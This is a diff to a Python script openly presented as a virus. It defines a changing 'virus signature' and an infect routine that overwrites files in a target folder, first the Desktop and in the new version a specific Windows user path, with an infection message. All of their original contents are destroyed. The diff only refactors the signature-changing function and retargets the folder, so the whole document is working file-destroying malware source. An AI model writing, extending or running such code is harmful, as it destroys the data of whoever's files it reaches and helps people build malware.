@@ -1,10 +1,9 @@
 import os
 import time
 
-
 VIRUS_SIGNATURE = "s0fTw4R30pT1m1z4t10n"
 
-TARGET_FOLDER = os.path.expanduser("~/Desktop")
+TARGET_FOLDER = os.path.expanduser("C:\\Users\\90507\\Desktop\\target")
 
 
 def generate_new_signature():
@@ -23,7 +22,6 @@ def infect(file_path):
     with open(file_path, "r") as f:
         content = f.read()
 
-    # check if it is already infected
     if VIRUS_SIGNATURE not in content:
         with open(file_path, "w") as f:
             f.write("This file has been infected by a virus.\n" + VIRUS_SIGNATURE)
@@ -31,8 +29,10 @@ def infect(file_path):
 
 def change_signature():
     global VIRUS_SIGNATURE
-    VIRUS_SIGNATURE = generate_new_signature()
+    new_signature = generate_new_signature()
+    VIRUS_SIGNATURE = new_signature
     print(f"New virus signature: {VIRUS_SIGNATURE}")
+    return VIRUS_SIGNATURE
 
 
 def trigger_virus():
@@ -48,3 +48,4 @@ if __name__ == "__main__":
     change_signature()
     print("Virus signature changed successfully!")
     infect_files()
+
